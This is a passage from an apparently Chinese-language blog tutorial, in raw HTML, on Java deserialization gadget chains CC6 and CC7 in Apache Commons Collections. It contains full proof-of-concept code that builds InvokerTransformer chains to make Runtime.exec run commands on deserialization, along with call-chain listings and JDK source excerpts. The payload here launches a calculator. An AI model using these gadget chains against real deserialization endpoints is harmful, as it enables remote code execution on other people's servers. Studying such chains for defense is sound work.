class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchFieldException </span>&#123;<br><br><br>        String cmd = <span class="hljs-string">&quot;open -a Calculator.app&quot;</span>;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> String[] &#123;cmd&#125;),<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br><br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);<br><br>        TiedMapEntry tiedmap = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,<span class="hljs-string">&quot;foo&quot;</span>);<br>        HashSet hashset = <span class="hljs-keyword">new</span> HashSet();<br>        hashset.add(tiedmap);<br>      <br>      	<span class="hljs-comment">// 由于创建hashset后，会自动给lazyMap添加一个key-value，所以要remove掉这个键值对</span><br>				<span class="hljs-comment">// 以保证lazyMap.get时，map.containsKey(key) == false，从而进入transform函数</span><br>				<span class="hljs-comment">// 避免hashset.add时本地触发exp add-&gt;map.put-&gt;map.hash-&gt;entry.hashcode-&gt;lazymap.get-&gt;transform</span><br>        outerMap.remove(<span class="hljs-string">&quot;foo&quot;</span>);<br><br><span class="hljs-comment">//        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="hljs-comment">//        f.setAccessible(true);</span><br><span class="hljs-comment">//        f.set(chainedTransformer, transformers);</span><br><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            outputStream.writeObject(hashset);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchFieldException </span>&#123;<br><br><br>        String cmd = <span class="hljs-string">&quot;open -a Calculator.app&quot;</span>;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> String[] &#123;cmd&#125;),<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br><br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);<br><br>        TiedMapEntry tiedmap = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,<span class="hljs-string">&quot;foo&quot;</span>);<br>        HashSet hashset = <span class="hljs-keyword">new</span> HashSet();<br>        hashset.add(tiedmap);<br>      <br>      	<span class="hljs-comment">// 由于创建hashset后，会自动给lazyMap添加一个key-value，所以要remove掉这个键值对</span><br>				<span class="hljs-comment">// 以保证lazyMap.get时，map.containsKey(key) == false，从而进入transform函数</span><br>				<span class="hljs-comment">// 避免hashset.add时本地触发exp add-&gt;map.put-&gt;map.hash-&gt;entry.hashcode-&gt;lazymap.get-&gt;transform</span><br>        outerMap.remove(<span class="hljs-string">&quot;foo&quot;</span>);<br><br><span class="hljs-comment">//        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="hljs-comment">//        f.setAccessible(true);</span><br><span class="hljs-comment">//        f.set(chainedTransformer, transformers);</span><br><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            outputStream.writeObject(hashset);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>





<p>利用链：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre class=" language-hljs stylus">java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectInputStream</span><span class="hljs-selector-class">.readObject</span>()<br>         java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.readObject</span>()<br>                 java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.put</span>()<br>                 java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.hash</span>()<br>                        org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span><span class="hljs-selector-class">.TiedMapEntry</span><span class="hljs-selector-class">.hashCode</span>()<br>                        org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span><span class="hljs-selector-class">.TiedMapEntry</span><span class="hljs-selector-class">.getValue</span>()<br>                             org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span><span class="hljs-selector-class">.get</span>()<br>                                  org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.ChainedTransformer</span><span class="hljs-selector-class">.transform</span>()<br>                                  org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span>()<br>                                   java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span>()<br>                                          java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span><span class="hljs-selector-class"><code class="language-hljs stylus">java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectInputStream</span><span class="hljs-selector-class">.readObject</span>()<br>         java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.readObject</span>()<br>                 java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.put</span>()<br>                 java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.hash</span>()<br>                        org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span><span class="hljs-selector-class">.TiedMapEntry</span><span class="hljs-selector-class">.hashCode</span>()<br>                        org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span><span class="hljs-selector-class">.TiedMapEntry</span><span class="hljs-selector-class">.getValue</span>()<br>                             org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span><span class="hljs-selector-class">.get</span>()<br>                                  org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.ChainedTransformer</span><span class="hljs-selector-class">.transform</span>()<br>                                  org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span>()<br>                                   java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span>()<br>                                          java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span><span class="hljs-selector-class">.exec</span>()<br></code></pre></td></tr></table></figure>





<h2 id="0x3-7-Commons-Collections7"><a href="#0x3-7-Commons-Collections7" class="headerlink" title="0x3.7 Commons Collections7"></a>0x3.7 Commons Collections7</h2><p>限制：</p>
<ul>
<li>JDK 1.8</li>
<li>Commons Collections 3.1</li>
</ul>
<p>CC7是利用HashTable的readObject来触发transform的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hashtable</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt;</span><br><span class="hljs-class">    <span class="hljs-keyword">extends</span> <span class="hljs-title">Dictionary</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt;</span><br><span class="hljs-class">    <span class="hljs-keyword">implements</span> <span class="hljs-title">Map</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt;, <span class="hljs-title">Cloneable</span>, <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br>  <br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream s)</span></span><br><span class="hljs-function">         <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-comment">//省略无关代码...</span><br><br>        <span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br>        <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                K key = (K)s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                V value = (V)s.readObject();<br>          <br>          	<span class="hljs-comment">// 触发点在这</span><br>            <span class="hljs-comment">// sync is eliminated for performance</span><br>            reconstitutionPut(table, key, value);<br>        &#125;<br>    &#125;<br>  <br>   	<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> StreamCorruptedException</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>        &#125;<br>        <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>        <span class="hljs-comment">// This should not happen in deserialized version.</span><br>      	<span class="hljs-comment">// 可以执行 hashCode方法，也就是可以联合TiedMapEntry</span><br>        <span class="hljs-keyword">int</span> hash = key.hashCode();<br>        <span class="hljs-keyword">int</span> index = (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>        <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-keyword">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// Creates the new entry.</span><br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>        tab[index] = <span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hashtable</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt;</span><br><span class="hljs-class">    <span class="hljs-keyword">extends</span> <span class="hljs-title">Dictionary</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt;</span><br><span class="hljs-class">    <span class="hljs-keyword">implements</span> <span class="hljs-title">Map</span>&lt;<span class="hljs-title">K</span>,<span class="hljs-title">V</span>&gt;, <span class="hljs-title">Cloneable</span>, <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br>  <br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream s)</span></span><br><span class="hljs-function">         <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-comment">//省略无关代码...</span><br><br>        <span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br>        <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                K key = (K)s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                V value = (V)s.readObject();<br>          <br>          	<span class="hljs-comment">// 触发点在这</span><br>            <span class="hljs-comment">// sync is eliminated for performance</span><br>            reconstitutionPut(table, key, value);<br>        &#125;<br>    &#125;<br>  <br>   	<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> StreamCorruptedException</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>        &#125;<br>        <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>        <span class="hljs-comment">// This should not happen in deserialized version.</span><br>      	<span class="hljs-comment">// 可以执行 hashCode方法，也就是可以联合TiedMapEntry</span><br>        <span class="hljs-keyword">int</span> hash = key.hashCode();<br>        <span class="hljs-keyword">int</span> index = (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>        <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-keyword">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> java.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// Creates the new entry.</span><br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>        tab[index] = <span class="hljs-keyword">new</span> Entry<>(hash, key, value, e);<br>        count++;<br>    &#125;<br></code></pre></td></tr></table></figure>



<p>CC7与CC6非常类似。</p>
<p>POC:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC7</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException </span>&#123;<br>        String cmd = <span class="hljs-string">&quot;calc&quot;</span>;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> String[] &#123;cmd&#125;),<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        HashMap&lt;String, String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);<br>        lazyMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">1</span>);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        Hashtable hashtable = <span class="hljs-keyword">new</span> Hashtable(<span class="hljs-number">1</span>);<br>        hashtable.put(tiedMapEntry, <span class="hljs-number">1</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            outputStream.writeObject(hashtable);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC7</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException </span>&#123;<br>        String cmd = <span class="hljs-string">&quot;calc&quot;</span>;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> String[] &#123;cmd&#125;),<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        HashMap&lt;String, String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);<br>        lazyMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">1</span>);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        Hashtable hashtable = <span class="hljs-keyword">new</span> Hashtable(<span class="hljs-number">1</span>);<br>        hashtable.put(tiedMapEntry, <span class="hljs-number">1</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            outputStream.writeObject(hashtable);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>调用链：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre class=" language-hljs stylus">java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.readObject</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.reconstitutionPut</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.AbstractMapDecorator</span><span class="hljs-selector-class">.equals</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.AbstractMap</span><span class="hljs-selector-class">.equals</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span><span class="hljs-selector-class">.get</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.ChainedTransformer</span><span class="hljs-selector-class">.transform</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class"><code class="language-hljs stylus">java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.readObject</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.reconstitutionPut</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.AbstractMapDecorator</span><span class="hljs-selector-class">.equals</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.AbstractMap</span><span class="hljs-selector-class">.equals</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span><span class="hljs-selector-class">.get</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.ChainedTransformer</span><span class="hljs-selector-class">.transform</span><br>org<span class="hljs-selector-class">.apache</span><span 